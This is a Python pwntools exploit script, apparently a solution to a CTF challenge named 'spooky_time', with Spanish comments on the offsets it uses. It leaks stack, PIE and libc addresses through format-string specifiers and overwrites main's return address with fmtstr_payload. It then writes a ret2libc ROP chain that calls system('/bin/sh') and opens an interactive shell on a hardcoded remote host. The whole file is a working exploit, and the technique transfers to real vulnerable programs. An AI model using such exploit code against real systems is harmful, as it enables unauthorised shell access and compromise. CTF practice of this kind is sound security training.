from pwn import *

gs = '''
b *main+175
continue
'''

elf = context.binary = ELF("./spooky_time")
libc = ELF("./glibc/libc.so.6")

def start():
    if args.REMOTE:
        #return remote("hidden.ctf.intigriti.io", 1337)
        return remote("94.237.59.199", 49135)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']

# Fuzzing

"""
for i in range(1, 200):
    io = process(elf.path)
    #io = start()

    io.recvuntil("scary!\n\n")

    io.sendline(f"AAAA.%{i}$p".encode())

    io.recvuntil(b"than")

    io.recvline()

    print(f"[+] {i}", io.recvline().strip())

    #input("PAUSE")

    io.close()
"""

# En 36 esta el pie
# En 3 esta libc address
# En 39 esta una direccion de la pila, sumale 0x441 y llegas a la funcion de ret de main a cambiar

io = start()

io.recvuntil("scary!\n\n")

#io.sendline(f"%3$p".encode())
io.sendline(f"%39$p.%36$p".encode())
#io.sendline(f"%3$p.%36$p".encode())
# stack_address.pie_address

io.recvuntil(b"than")

io.recvline()

ans = io.recvline().strip().decode().split(".")

#leak_libc, pie_base = int(ans[0],16), int(ans[1], 16) - 0x40
# - 0x441 para llegar a ret address de main 
# - 0x2dd1 para tocar canary
# En 3 puedes editar por cierto pero solo para el primer format string
# En 8 para el siguiente format string
# Tremendo bugaso en el que me meti en ese entonces para darme cuenta de la diferencia
# porque editar en 3 no es lo mismo que en 8 xD dolio pero se aprendio

stack_leak, pie_base = int(ans[0], 16) - 0x441, int(ans[1], 16) - 0x40

#print(f"[+] Leak Libc: {hex(leak_libc)}")

print(f"[+] Stack Leak Address: {hex(stack_leak)}")

#libc.address = leak_libc - (libc.sym.write + 23)
elf.address = pie_base

#print(f"[+] System: {hex(libc.sym.system)}")

print(f"[+] elf.got.puts: {hex(elf.got.puts)}")

print(f"[+] elf.got.printf: {hex(elf.got.printf)}")

#string_better_luck_address = elf.got.puts  - 0x378

#print(f"[+] Better Luck Address: {hex(string_better_luck_address)}")

ret_address = stack_leak 

rop = ROP(elf)

ret = rop.find_gadget(['ret'])[0]

payload = b"".join([
    p64(ret),
    p64(elf.sym.main)
])

writes_dict = {
        ret_address: payload
        #elf.got.puts : libc.sym.system,
}

payload = fmtstr_payload(8, writes_dict, write_size='short')

#payload = fmtstr_payload(8, {stack_leak: elf.sym.main}, write_size='short')

io.recvuntil(b"time..")

io.recvline()
io.recvline()
io.recvline()
#print(elf.got)
#input("PAUSE")
io.sendline(payload)

# Ahora si toca modificar algunas cosas pero antes likear libc base

io.recvuntil("scary!\n\n")

io.sendline(f"%37$p.%3$p".encode())
# stack address . libc address

io.recvuntil(b"Seriously?? I bet you can do better than")

io.recvline()

ans = io.recvline().strip().decode().split(".")
print(ans)

leak_stack_address, leak_libc = int(ans[0], 16), int(ans[1], 16)


#leak_libc = int(io.recvline().strip().decode(), 16)

print(f"[+] Leak Libc: {hex(leak_libc)}")

libc.address = (leak_libc - 23) - libc.sym.write

print(f"[+] System: {hex(libc.sym.system)}")

rsp_stack_address = leak_stack_address - 0x431

# Pudes hacerlo con otra vueltita a main ret => main o directamente armar el ropchain para hacer el ret2libc

rop = ROP(libc)

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

payload = b"".join([
    p64(pop_rdi),
    p64(next(libc.search(b"/bin/sh"))),
    p64(ret),
    p64(libc.sym.system)
])

io.recvuntil(b"time..")

io.recvline()
io.recvline()
io.recvline()

writes_dict = {
        rsp_stack_address: payload
}

payload = fmtstr_payload(8, writes_dict, write_size='short')

io.sendline(payload)
io.interactive()
